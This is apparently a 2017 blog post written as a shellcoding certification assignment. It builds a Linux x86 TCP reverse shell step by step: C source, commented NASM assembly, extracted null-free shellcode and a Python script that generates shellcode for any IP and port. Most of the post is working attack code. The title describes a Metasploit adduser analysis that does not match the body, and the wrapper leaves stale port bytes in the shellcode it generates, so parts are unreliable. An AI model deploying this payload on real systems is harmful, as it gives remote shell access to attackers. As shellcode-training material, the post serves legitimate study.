---
layout: post
title: "Analyzing Metasploit linux/x86/adduser module using GDB"
date: 2017-05-04 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)._
_**Student ID:** SLAE-885_
_**Assignment number:** 2_
_**Github repo:** <https://github.com/abatchy17/SLAE>_  

---
  

## What are the requirements for a reverse shell?

A reverse shell requires the following:  

  1. Connect to an IP on a given port (now acting as a client).
  2. Spawn a shell upon connecting.

Most of the process is very similar to [the bind shell example](http://www.abatchy.com/2017/05/tcp-bind-shell-in-assembly-null.html) (which means lots of repetition here), with a few twists:  
  
1\. Listener is **external**, by that it means our code won't be listening to incoming connections, instead it will connect to an existing open port waiting for a connection.
2\. IP and port need to be defined in the code, bind shell **only** needed a port to start listening on. 

---

## TCP reverse shell in C

```cpp
#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int client_sockid;  // sockfd for client  
int host_sockid;    // sockfd for host  
      
struct sockaddr_in hostaddr;            // sockaddr struct   
  
int main()  
{  
    // Create socket  
    client_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Initialize sockaddr struct to bind socket using it  
    hostaddr.sin_family = AF_INET;  
    hostaddr.sin_port = htons(1337);  
    hostaddr.sin_addr.s_addr = inet_addr("127.0.0.1");  
  
    // Connect to existing listener  
    connect(client_sockid, (struct sockaddr*)&hostaddr, sizeof(hostaddr));  
  
    // Duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    return 0;  
} 
```
  
Again, this code lacks error checking and shouldn't be used as is, for a more robust code, check my [sockets](https://github.com/abatchy17/sockets) repo.  

### Quick break down:

1\. Create socket  
2\. Connect to listener  
3\. Redirect `STDIN`, `STDOUT` and `STDERR` to newly created socket from client.  
4\. Spawn the shell.  
  
---

## Converting module to assembly (_sigh_)

For socket programming through syscalls you'll need to make use of three registers:  
1\. `EAX` should always contain 0x66, which is the number of `socketcall()` defined in the linux headers.  
2\. `EBX` should contain the call ID for the specific socket function you want to execute, which is defined in `/usr/include/linux/net.h`.  
3\. `ECX` contains a pointer to the arguments.  
  

[![](http://i.imgur.com/OrTXm31.png)](http://i.imgur.com/OrTXm31.png)

```nasm
global _start  
section .text  
  
_start:  
    ; Socket functions should be accessed through socketcall()  
    ; References:  
    ;   1. http://man7.org/linux/man-pages/man2/socketcall.2.html  
    ;   2. http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210  
    ; Call ids are defined in /usr/include/linux/net.h and should be put in EBX  
  
    ;  
    ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)  
    ;  
    cdq                 ; EDX = 0x0 | Saves a byte  
    xor ebx, ebx  
    inc ebx             ; EBX = 0x1 | #define SYS_SOCKET 1  
                        ; saves a byte instead of mov bl, 1  
    push edx            ; zeroed out earlier  
                        ; protocol = 0  
    push ebx            ; SOCK_STREAM = 1  
                        ; Needed for bind(), can be used here to save a few bytes  
    push byte 0x2       ; PF_INET = 2  
    mov ecx, esp  
    push byte 0x66      ; socketcall()  
    pop eax             ; EAX = 0x66  
    int 0x80  
  
    xchg esi, eax       ; sockfd is now stored in esi  
  
    ;  
    ; connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16)  
    ;  
    inc ebx             ; EBX = 0x2   
    push 0x0101017f       ; sockaddr.sin_addr.s_addr: 127.0.0.1 (big endian)  
    push word 0x3905    ; sockaddr.sin_port       : PORT = 1337  
    push bx             ; sockaddr.sin_family     : AF_INET = 2  
    mov ecx, esp        ; ECX holds pointer to struct sockaddr  
  
    push 0x10           ; sizeof(sockaddr)  
    push ecx            ; pointer to sockaddr  
    push esi            ; sockfd  
    mov ecx, esp        ; ECX holds pointer to arguments  
    inc ebx             ; EBX = 0x3 | #define SYS_CONNECT 3  
    mov al, 0x66        ; socketcall()  
    int 0x80  
  
    xchg ebx, esi  
      
    ;  
    ; dup2(ebx, {0,1,2})  
    ;  
    xor ecx, ecx  
lbl:  
    mov al, 0x3f  ; dup2()  
    int 0x80  
    inc ecx    ; Iterate over {0,1,2}  
    cmp cl, 0x4   ; Are we done?  
    jne lbl    ; Nope  
      
    ; execve("/bin//sh", NULL, NULL)  
    push edx   ; Null terminator  
    push 0x68732f2f  ; "hs//"  
    push 0x6e69622f  ; "nib/"  
      
    mov ebx, esp  ; EBX points to "/bin//sh"  
    mov ecx, edx  ; ECX = NULL`  
      
    mov al, 0xb   ; execve()  
    int 0x80  
```   

  
As you noticed, when calling `connect()`, we defined port 1337 as `0x3905` instead of `0x0539`, and local IP 127.1.1.1 (we avoided 127.0.0.1 because of null characters) was converted to 0x0101017f instead of 0x7F010101. This is because it's in network byte order, which is big-endian. In the example code you should still call `htonl()` / `inet_addr()` even if your CPU is big-endian for cross compatibility.  

---

## Testing our shell

### 1\. Start a listener

  

[![](http://i.imgur.com/pn93ioR.png)](http://i.imgur.com/pn93ioR.png)  

---

### 2\. Compile code and run

  

[![](http://i.imgur.com/XezGi4W.png)](http://i.imgur.com/XezGi4W.png)

---

### 3\. Check listener


[![](http://i.imgur.com/DHBvMSq.png)](http://i.imgur.com/DHBvMSq.png)

---

## Extracting the shellcode

```console
abatchy@ubuntu:~/Desktop/work$ objdump -d ./reverse_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'  
"\x99\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\x6a\x66\x58\xcd\x80\x96\x43\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"  
```    

---

## Python wrapper
```python
#!/usr/bin/python  
  
import socket  
import sys  
import struct  
  
if len(sys.argv) is not 3:  
    print "Usage: {0} IP PORT".format(sys.argv[0])  
    exit()  
  
ip = socket.inet_aton(sys.argv[1])  
port = int(sys.argv[2])  
  
if port < 1 or port > 65535:  
    print "Are you kidding?"  
    exit()  
  
if port <= 1000:  
    print "Port will bind only if run as root"  
  
# ugly code, don't look  
port = format(port, '04x')  
port = "\\x" + str(port[2:4]) + "\\x" + str(port[0:2])  
  
ip = ip.encode('hex')  
ip = "\\x" + ip[0:2] + "\\x" + ip[2:4] + "\\x" + ip[4:6] + "\\x" + ip[6:8]  
  
sc = "\\x99\\x31\\xdb\\x43\\x52\\x53\\x6a\\x02\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x96\\x43\\x68" + ip + "\\x66\\x68" + port + "\\x05\\x39\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x87\\xde\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75\\xf6\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80"  
  
print "Shellcode generated:"  
print sc  
```

---

## Final notes

1\. Shellcode is **null free** assuming the port number is too.  
2\. Shellcode size is **74 bytes**.  
3\. Shellcode is **register-independant**.  

---

## References:

1\. <http://man7.org/linux/man-pages/man2/socketcall.2.html>
2\. <http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210>.
3\. Hacking: The Art of Exploitation (2nd Edition) - Chapter 4 and 5  

\- Abatchy

